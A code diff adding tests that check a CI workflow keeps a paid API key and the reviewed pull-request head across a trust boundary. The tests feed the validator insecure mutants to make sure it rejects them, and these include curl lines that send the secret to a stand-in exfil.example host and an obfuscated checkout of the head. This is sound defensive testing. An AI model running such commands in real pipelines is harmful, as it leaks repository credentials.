@@ -27,6 +27,14 @@ import {
     STEP_INVENTORY,
 } from '../healthGateWorkflowContract';
 import { assertHostedQuantumMeasurementWorkflow } from '../hostedQuantumMeasurementWorkflowContract';
+import {
+    assertSemanticReviewWorkflow,
+    SEMANTIC_REVIEW_ASSESS_STEP,
+    SEMANTIC_REVIEW_CHECKOUT_STEP,
+    SEMANTIC_REVIEW_HEAD_EXPRESSION,
+    SEMANTIC_REVIEW_KEY_ENV,
+    SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION,
+} from '../semanticReviewWorkflowContract';
 
 type UnknownRecord = Record<string, unknown>;
 type JobResult = 'cancelled' | 'failure' | 'skipped' | 'success';
@@ -384,6 +392,7 @@ const { parsed: validationWorkflow } = loadWorkflow('validation.yml');
 const { parsed: heavyWorkflow } = loadWorkflow('heavy-gates.yml');
 const { document: nightlyDocument, parsed: nightly } = loadWorkflow('nightly.yml');
 const { parsed: hostedQuantumMeasurement } = loadWorkflow('quantum-measurements.yml');
+const { parsed: semanticReviewWorkflow } = loadWorkflow('semantic-review.yml');
 const { parsed: hostedWasm } = loadWorkflow('wasm-artifacts.yml');
 const parsedVercelConfig: unknown = JSON.parse(readFileSync(join(repositoryRoot, 'vercel.json'), 'utf8'));
 const vercelConfig = asRecord(parsedVercelConfig, 'Vercel configuration');
@@ -954,6 +963,7 @@ type WorkflowSet = {
     nightly: UnknownRecord;
     hostedQuantumMeasurement: UnknownRecord;
     hostedWasm: UnknownRecord;
+    semanticReview: UnknownRecord;
 };
 
 function workflowSet(): WorkflowSet {
@@ -964,6 +974,7 @@ function workflowSet(): WorkflowSet {
         nightly,
         hostedQuantumMeasurement,
         hostedWasm,
+        semanticReview: semanticReviewWorkflow,
     };
 }
 
@@ -976,6 +987,7 @@ function cloneWorkflows(label: string): WorkflowSet {
         nightly: asRecord(clone.nightly, `${label} nightly`),
         hostedQuantumMeasurement: asRecord(clone.hostedQuantumMeasurement, `${label} hosted quantum measurement`),
         hostedWasm: asRecord(clone.hostedWasm, `${label} hosted WASM`),
+        semanticReview: asRecord(clone.semanticReview, `${label} semantic review`),
     };
 }
 
@@ -1006,6 +1018,7 @@ function workflowFiles(set: WorkflowSet): ReadonlyArray<readonly [string, Unknow
         ['nightly.yml', set.nightly],
         ['quantum-measurements.yml', set.hostedQuantumMeasurement],
         ['wasm-artifacts.yml', set.hostedWasm],
+        ['semantic-review.yml', set.semanticReview],
     ];
 }
 
@@ -1834,6 +1847,217 @@ describe('health gates workflow contract', () => {
         const unqualified = structuredClone(hostedWasm);
         recordAt(stepNamed(jobAt(unqualified, 'build-artifacts'), 'Upload qualified artifact'), 'with').path = '.';
         expect(() => assertHostedWasmWorkflow(unqualified)).toThrow('only qualified output');
+    });
+
+    // The advisory review is the only workflow here that holds a paid external
+    // credential, and every one of these mutants is a plausible tidy-up that
+    // would move the head or the key across the trust boundary while leaving
+    // the file looking right.
+    it('keeps the advisory semantic review on the trusted revision and out of the head', () => {
+        expect(() => assertSemanticReviewWorkflow(semanticReviewWorkflow)).not.toThrow();
+
+        // The tempting shape: assess the head by checking it out. It would put
+        // files the change controls in the tree of the job that reads the key.
+        const headCheckout = structuredClone(semanticReviewWorkflow);
+        recordAt(stepNamed(jobAt(headCheckout, 'assess'), SEMANTIC_REVIEW_CHECKOUT_STEP), 'with').ref =
+            SEMANTIC_REVIEW_HEAD_EXPRESSION;
+        expect(() => assertSemanticReviewWorkflow(headCheckout)).toThrow('a trusted checkout');
+
+        // On `pull_request` GitHub takes the workflow definition from the head,
+        // so the change under review could edit the job that reads the key.
+        const unprivileged = structuredClone(semanticReviewWorkflow);
+        recordAt(unprivileged, 'on').pull_request = {};
+        expect(() => assertSemanticReviewWorkflow(unprivileged)).toThrow(
+            'the privileged pull-request-target trigger and manual dispatch'
+        );
+
+        // A persisted credential leaves a usable token in the tree the job
+        // reads the report from.
+        const persisted = structuredClone(semanticReviewWorkflow);
+        recordAt(stepNamed(jobAt(persisted, 'assess'), SEMANTIC_REVIEW_CHECKOUT_STEP), 'with')['persist-credentials'] =
+            true;
+        expect(() => assertSemanticReviewWorkflow(persisted)).toThrow(
+            'no persisted credential in the checked-out tree'
+        );
+
+        // Declared on the job, the key reaches the install step as well.
+        const jobKey = structuredClone(semanticReviewWorkflow);
+        jobAt(jobKey, 'assess').env = { [SEMANTIC_REVIEW_KEY_ENV]: SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION };
+        expect(() => assertSemanticReviewWorkflow(jobKey)).toThrow(
+            'must mention a repository secret exactly once, on the assessment step'
+        );
+
+        // The key has to be the one the command reads, on the step that sends it.
+        const keyless = structuredClone(semanticReviewWorkflow);
+        const keylessAssess = stepNamed(jobAt(keyless, 'assess'), SEMANTIC_REVIEW_ASSESS_STEP);
+        delete recordAt(keylessAssess, 'env')[SEMANTIC_REVIEW_KEY_ENV];
+        expect(() => assertSemanticReviewWorkflow(keyless)).toThrow('the provider key only on the assessment step');
+
+        // A key on any other step is the same leak one step over.
+        const leakedStep = structuredClone(semanticReviewWorkflow);
+        stepNamed(jobAt(leakedStep, 'assess'), 'Upload the advisory report').env = {
+            [SEMANTIC_REVIEW_KEY_ENV]: SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION,
+        };
+        expect(() => assertSemanticReviewWorkflow(leakedStep)).toThrow(
+            'must mention a repository secret exactly once, on the assessment step'
+        );
+
+        // The rearrangement that matters: the credential moves to another step under a new variable
+        // name, so counting the name alone reports the boundary intact. The probe for this one is the
+        // finding it repairs — with only the name counted, this mutant passed every named assertion.
+        const renamedKey = structuredClone(semanticReviewWorkflow);
+        stepNamed(jobAt(renamedKey, 'assess'), 'Report the assessment').env = {
+            LEAKED_JEV: SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION,
+        };
+        expect(() => assertSemanticReviewWorkflow(renamedKey)).toThrow(
+            'must mention a repository secret exactly once, on the assessment step'
+        );
+
+        // The spelling the literal match missed. `${{ secrets['JEV_KEY'] }}` is the same credential,
+        // and it walked past a pin that looked for one exact expression.
+        const bracketKey = structuredClone(semanticReviewWorkflow);
+        stepNamed(jobAt(bracketKey, 'assess'), 'Report the assessment').env = {
+            LEAKED_JEV: "${{ secrets['JEV_KEY'] }}",
+        };
+        expect(() => assertSemanticReviewWorkflow(bracketKey)).toThrow(
+            'must mention a repository secret exactly once, on the assessment step'
+        );
+
+        // And a second variable beside the key on the assessment step, which the whole-environment
+        // pin refuses however it is spelled.
+        const extraAssessVariable = structuredClone(semanticReviewWorkflow);
+        recordAt(stepNamed(jobAt(extraAssessVariable, 'assess'), SEMANTIC_REVIEW_ASSESS_STEP), 'env').EXTRA = 'x';
+        expect(() => assertSemanticReviewWorkflow(extraAssessVariable)).toThrow(
+            'exactly the provider key and the read-scoped token on the assessment step'
+        );
+
+        // Any repository secret on another step, not only this one.
+        const otherSecret = structuredClone(semanticReviewWorkflow);
+        stepNamed(jobAt(otherSecret, 'assess'), 'Install dependencies').env = {
+            OTHER_TOKEN: '${{ secrets.SOMETHING_ELSE }}',
+        };
+        expect(() => assertSemanticReviewWorkflow(otherSecret)).toThrow(
+            'must mention a repository secret exactly once, on the assessment step'
+        );
+
+        // And a secret declared for the whole workflow, which every step would then inherit.
+        const workflowSecret = structuredClone(semanticReviewWorkflow);
+        workflowSecret.env = { ...recordAt(workflowSecret, 'env'), INHERITED: '${{ secrets.SOMETHING_ELSE }}' };
+        expect(() => assertSemanticReviewWorkflow(workflowSecret)).toThrow(
+            'must mention a repository secret exactly once, on the assessment step'
+        );
+
+        // Enumerating the ways to move a working tree is a list that cannot be finished. Three
+        // revisions of this pin matched text — three subcommands, then the substring `git`, then one
+        // secret spelling — and each fell to a form it did not enumerate. Every executable string is
+        // compared exactly now, so every obfuscation that defeated a search is one case.
+        for (const [label, command] of [
+            ['a reset', 'git reset --hard refs/remotes/pull/${PR_NUMBER}/head'],
+            ['an obfuscated checkout', "g''it checkout refs/remotes/pull/${PR_NUMBER}/head"],
+            ['a curl of the head', 'curl -sO https://example.invalid/head.tar'],
+            ['an unrelated status', 'git status --short'],
+        ] as const) {
+            const appended = structuredClone(semanticReviewWorkflow);
+            const appendix = stepNamed(jobAt(appended, 'assess'), 'Install dependencies');
+            appendix.run = `${String(appendix.run)} && ${String(command)}`;
+            expect(() => assertSemanticReviewWorkflow(appended)).toThrow(
+                'exactly the pinned command in Install dependencies'
+            );
+            expect(label).not.toBe('');
+        }
+
+        // A fifth step that runs anything at all is unpinned, and that is a refusal rather than a
+        // silently accepted addition.
+        const extraRunner = structuredClone(semanticReviewWorkflow);
+        stepNamed(jobAt(extraRunner, 'assess'), 'Set up Node').run = 'echo hello';
+        expect(() => assertSemanticReviewWorkflow(extraRunner)).toThrow('exactly four executable steps');
+
+        // A run supplied as a YAML sequence has the same effect and a different shape, and is refused
+        // as not being the pinned string.
+        const listForm = structuredClone(semanticReviewWorkflow);
+        stepNamed(jobAt(listForm, 'assess'), 'Install dependencies').run = [
+            'pnpm install --frozen-lockfile --ignore-scripts',
+        ];
+        // A non-string run cannot be compared to a pinned command, so it is refused outright
+        // rather than skipped -- which is what let a list-form run through an earlier revision.
+        expect(() => assertSemanticReviewWorkflow(listForm)).toThrow('Install dependencies run must be a string');
+
+        // The head-expression guard needs a mutant that fails *because of it*: assigning the head to
+        // the checkout's ref is refused earlier, by the trusted-checkout assertion.
+        const headInEnvironment = structuredClone(semanticReviewWorkflow);
+        stepNamed(jobAt(headInEnvironment, 'assess'), 'Install dependencies').env = {
+            HEAD_UNDER_REVIEW: SEMANTIC_REVIEW_HEAD_EXPRESSION,
+        };
+        expect(() => assertSemanticReviewWorkflow(headInEnvironment)).toThrow(
+            'must not reference the reviewed head sha'
+        );
+
+        // Reading the environment blocks left the placement class the pin never looked at: a secret
+        // reference inside a step's `run` or its action inputs is evaluated all the same.
+        for (const [label, place] of [
+            [
+                'a run string',
+                (clone: UnknownRecord) => {
+                    const step = stepNamed(jobAt(clone, 'assess'), 'Report the assessment');
+                    // A single-quoted literal: the expression is text here, not interpolation.
+                    const exfiltration = 'curl -s "https://exfil.example/${{ secrets.JEV_KEY }}"';
+                    step.run = `${String(step.run)}\n${exfiltration}`;
+                },
+            ],
+            [
+                'action inputs',
+                (clone: UnknownRecord) => {
+                    const step = stepNamed(jobAt(clone, 'assess'), 'Set up Node');
+                    step.with = { ...asRecord(step.with ?? {}, 'set up node inputs'), token: '${{ secrets.JEV_KEY }}' };
+                },
+            ],
+        ] as const) {
+            const placed = structuredClone(semanticReviewWorkflow);
+            place(placed);
+            // A credential spliced into a pinned command breaks the command's own pin before the
+            // mention count is reached; an unpinned action input is caught by the count. Both refuse.
+            expect(
+                () => assertSemanticReviewWorkflow(placed),
+                `a secret reference in ${label} must be refused`
+            ).toThrow(/exactly the pinned command|must mention a repository secret exactly once/u);
+        }
+
+        // The token's name was pinned and its value was not, so a write-capable personal token under
+        // the same name passed — the tidy-up a rate-limited run invites.
+        const widenedToken = structuredClone(semanticReviewWorkflow);
+        recordAt(stepNamed(jobAt(widenedToken, 'assess'), SEMANTIC_REVIEW_ASSESS_STEP), 'env').GH_TOKEN =
+            'a personal token';
+        expect(() => assertSemanticReviewWorkflow(widenedToken)).toThrow(
+            'the read-scoped token, and no other, on the assessment step'
+        );
+
+        // The credential-bearing step was pinned by substring, so any appended command passed while
+        // the step still "ran the scan".
+        const exfiltrating = structuredClone(semanticReviewWorkflow);
+        const exfiltratingAssess = stepNamed(jobAt(exfiltrating, 'assess'), SEMANTIC_REVIEW_ASSESS_STEP);
+        exfiltratingAssess.run = `${String(exfiltratingAssess.run)}curl -s "https://exfil.example/$TYPESAFE_API_KEY"`;
+        expect(() => assertSemanticReviewWorkflow(exfiltrating)).toThrow(
+            'exactly the pinned command in Assess the change, and nothing else'
+        );
+
+        // `checks: write` buys nothing here: the check is the job's own, so a
+        // write token would sit beside the key for no reason.
+        const writeToken = structuredClone(semanticReviewWorkflow);
+        recordAt(writeToken, 'permissions').checks = 'write';
+        expect(() => assertSemanticReviewWorkflow(writeToken)).toThrow('read-only repository permissions');
+
+        // Dropping the gate spends the owner's key on a different trust domain.
+        const openToForks = structuredClone(semanticReviewWorkflow);
+        jobAt(openToForks, 'assess').if = '${{ !cancelled() }}';
+        expect(() => assertSemanticReviewWorkflow(openToForks)).toThrow(
+            'its fork, draft, and default-branch eligibility condition'
+        );
+
+        // A renamed check detaches the workflow from the context a reader looks
+        // for, and would collide with the required one.
+        const renamed = structuredClone(semanticReviewWorkflow);
+        jobAt(renamed, 'assess').name = 'Gate';
+        expect(() => assertSemanticReviewWorkflow(renamed)).toThrow('its distinct advisory check name');
     });
     afterEach(() => {
         vi.unstubAllGlobals();
